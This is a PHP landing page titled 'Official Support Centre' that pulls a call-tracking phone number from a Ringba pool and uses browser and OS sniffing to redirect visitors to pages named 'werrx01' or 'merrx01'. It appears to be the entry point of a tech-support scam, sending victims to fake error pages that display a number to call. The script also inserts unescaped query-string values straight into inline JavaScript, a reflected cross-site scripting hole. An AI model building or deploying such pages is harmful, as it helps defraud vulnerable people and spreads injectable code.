<?php
include 'ringba_get_number.php';

$tags      = $_GET;
$number    = $_GET['number'];
$landingPageURL = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
$phone_number = ringba_get_pool_number($tags, $landingPageURL);
$phone_number = format_number_tfn($phone_number);
$phone_number = str_replace(' ','',$phone_number);
$number = str_replace(' ','',$number);

$re         = '/\d{3}/m';
$matches    = [];
preg_match_all($re, $phone_number, $matches, PREG_SET_ORDER, 0);

if( empty($matches) )
{
    $phone_number = $number;
}


$parsed = parse_url($_SERVER['QUERY_STRING']);
$query = $parsed['path'];

parse_str($query, $params);

unset($params['number']);
$string = http_build_query($params);

?>
<xmlns="http:/www.w3.org/1999/xhtml">
<head>



    
    <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
    <meta name="robots" content="noindex,nofollow">
    <title>Official Support Centre</title>

    <script type="text/javascript">
        var isChromium = window.chrome,
            vendorName = window.navigator.vendor,
            isOpera = window.navigator.userAgent.indexOf("OPR") > -1,
            isIEedge = window.navigator.userAgent.indexOf("Edge") > -1;
        if (isChromium !== null && isChromium !== undefined && vendorName === "Google Inc." && isOpera == false && isIEedge == false)
        {
            // is Google chrome
            window.location.href = "./werrx01/?phone=<?=$phone_number?>&<?=$string?>";
        }
        if (navigator.userAgent.indexOf("Firefox") != -1) {
            window.location.href = "./werrx01/?phone=<?=$phone_number?>&<?=$string?>";
        }
        if (window.navigator.userAgent.indexOf("Edge") != -1) {
            window.location.href = "./werrx01/?phone=<?=$phone_number?>&<?=$string?>";
        }
if (window.navigator.userAgent.indexOf("Opera") != -1) {
            window.location.href = "./werrx01/?phone=<?=$phone_number?>&<?=$string?>";
        }

        if ((navigator.userAgent.indexOf("MSIE") != -1) || (!!document.documentMode == true)) //IF IE > 10
        {
            window.location.href = "./werrx01/?phone=<?=$phone_number?>&<?=$string?>";
        }


        if (navigator.appVersion.indexOf("Mac") != -1) OSName = "MacOS";

        var isOpera = !!window.opera || navigator.userAgent.indexOf('Opera') >= 0;
        // Opera 8.0+ (UA detection to detect Blink/v8-powered Opera)
        var isFirefox = typeof InstallTrigger !== 'undefined';   // Firefox 1.0+
        var isSafari = Object.prototype.toString.call(window.HTMLElement).indexOf('Constructor') > 0;
        // At least Safari 3+: "[object HTMLElementConstructor]"
        var isChrome = !!window.chrome;                          // Chrome 1+
        var isIE = /*@cc_on!@*/false;                            // At least IE6

        if (OSName == "MacOS" && isChrome == true) {
            window.location.href = "./merrx01/?phone=<?=$phone_number?>&<?=$string?>";
        }
        else if (OSName == "MacOS" && isChrome == true) {
            window.location.href = "./merrx01/?phone=<?=$phone_number?>&<?=$string?>";
        }

        if (navigator.userAgent.indexOf("Firefox") != -1) {
            window.location.href = "./merrx01/?phone=<?=$phone_number?>&<?=$string?>";
        }

        if (window.navigator.userAgent.indexOf("Opera") != -1) {
            window.location.href = "./merrx01/?phone=<?=$phone_number?>&<?=$string?>";
        }

        if (navigator.userAgent.indexOf("Safari") != -1) {
            window.location.href = "./merrx01/?phone=<?=$phone_number?>&<?=$string?>";
        }

    </script>

</head>
<body>

</body>


</html>
